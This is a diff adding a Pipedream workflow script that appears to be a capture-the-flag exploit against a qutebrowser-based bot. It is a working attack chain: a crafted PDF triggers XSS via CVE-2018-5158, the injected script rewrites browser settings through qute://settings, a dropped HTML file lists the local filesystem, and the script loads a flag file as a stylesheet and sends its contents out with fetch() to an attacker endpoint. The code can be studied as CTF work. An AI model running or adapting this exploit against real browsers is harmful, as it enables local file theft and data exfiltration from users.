@@ -1,0 +1,86 @@
+export default defineComponent({
+  async run({ steps, $ }) {
+
+    /* 
+       Idea: XSS on setting page with PDF viewer using CVE-2018-5158, and then do all kinds of weird thing to try to RCE or LFR
+
+       Step 1: Force download a payload file for local filename reading:
+       https://blah.m.pipedream.net/?z=1
+
+       Step 2: Ask the bot to open the local file to get the random filename (yeah it is quite wtf):
+       http://../../tmp/httpnooneplays.htm
+
+       Step 3: Read the content of the flag in the file with random filename
+       https://blah.m.pipedream.net/?z=2
+    */
+
+    const payload_filename = "httpnooneplays.htm"; // change to whatever name you like
+    const flag_filename = "/proof_d2e4f0a6-55e8-4897-9ce0-e829cdc8279e.sh"; // change after Step 2
+    
+    const pdf_payload1 = "/%PDF-1.4\n1 0 obj\n<<\n  /FunctionType 4\n  /Domain [(";
+    const pdf_payload2 = ") 0]\n  /Range [0 0]\n  /Length 12\n>>\nstream\n{\n  0 add\n}\nendstream\nendobj\n2 0 obj\n<<\n  /Type /Catalog\n  /Pages 3 0 R\n>>\nendobj\n3 0 obj\n<<\n  /Type /Pages\n  /Kids [6 0 R]\n  /Count 1\n>>\nendobj\n4 0 obj\n[ /Indexed\n  [ /DeviceN\n    [/Cyan /Black]\n    /DeviceCMYK\n    1 0 R\n  ]\n  1(123)\n]\nendobj\n5 0 obj\n<<\n  /Type /XObject\n  /Subtype /Image\n  /Width 1\n  /Height 1\n  /ColorSpace 4 0 R\n  /BitsPerComponent 8\n  /Length 1\n>>\nstream\nx\nendstream\nendobj\n6 0 obj\n<<\n  /Type /Page\n  /Parent 3 0 R\n  /Resources\n  <<\n    /XObject << /Im5 5 0 R >>\n  >>\n  /MediaBox [0 0 100 100]\n  /Contents 7 0 R\n>>\nendobj\n7 0 obj\n<<\n  /Length 100\n>>\nstream\n  1  1  1  rg\n  0  0  100 100 re  f\n  BT\n    /Para << /MCID 1 >>\n    BDC\n      /Im5 Do\n    EMC\n  ET\nendstream\nendobj\ntrailer\n<<\n  /Root 2 0 R\n>>\nstartxref\n%%EOF\n";
+
+    if(steps.trigger.event.query.z == 1){
+      // The payload that triggers XSS in setting page to force download
+      const payload = `
+(i = open('qute://settings')) +
+(i.onload = _ => {
+    (i.cset('downloads.location.directory','/tmp')) +
+    (i.cset('downloads.location.prompt','false')) + 
+    (open('`+steps.trigger.event.url+`1'))
+})
+      `;
+      await $.respond({
+        status: 200,
+        headers: {'Content-Type': 'application/pdf',
+                  'Content-Disposition': 'attachment; filename="z"'},
+        body: pdf_payload1 + payload + pdf_payload2,
+      });
+    }else if(steps.trigger.event.query.z == 11){
+      // The payload file that reads local filename
+      await $.respond({
+        status: 200,
+        headers: {'Content-Type': 'text/html',
+                  'Content-Disposition': 'attachment; filename="'+payload_filename+'"'},
+        body: `<body><script>
+i=document.createElement('iframe');
+i.src='file:///';
+i.onload = () => {
+    o = i.contentWindow.document.body.innerText.match(/(proof.+\.sh)/)[1];
+    open('`+steps.trigger.event.url+`1&f='+o);
+}
+document.body.appendChild(i);
+</script></body>`,
+      })
+    }else if(steps.trigger.event.query.z == 2){
+      // The payload that triggers XSS in setting page to read the flag as CSS
+      const payload = `
+(i = open('qute://settings')) +
+(i.onload = _ => {
+    (i.cset('content.user_stylesheets','`+flag_filename+`')) +
+    (open('`+steps.trigger.event.url+`2'))
+})
+      `;
+      await $.respond({
+        status: 200,
+        headers: {'Content-Type': 'application/pdf',
+                  'Content-Disposition': 'attachment; filename="z"'},
+        body: pdf_payload1 + payload + pdf_payload2,
+      });
+    }else if(steps.trigger.event.query.z == 22){
+      // The payload that sends back the flag to the attacker
+      await $.respond({
+        status: 200,
+        headers: {},
+        body: `<script>onload=()=>{fetch('`+steps.trigger.event.url+`2&f='+btoa(document.getElementsByTagName('style')[0].innerText));}</script>`,
+      })
+    }else{
+      await $.respond({
+        status: 200,
+        headers: {},
+        body: "Hello World!",
+      })
+    }
+
+  },
+})
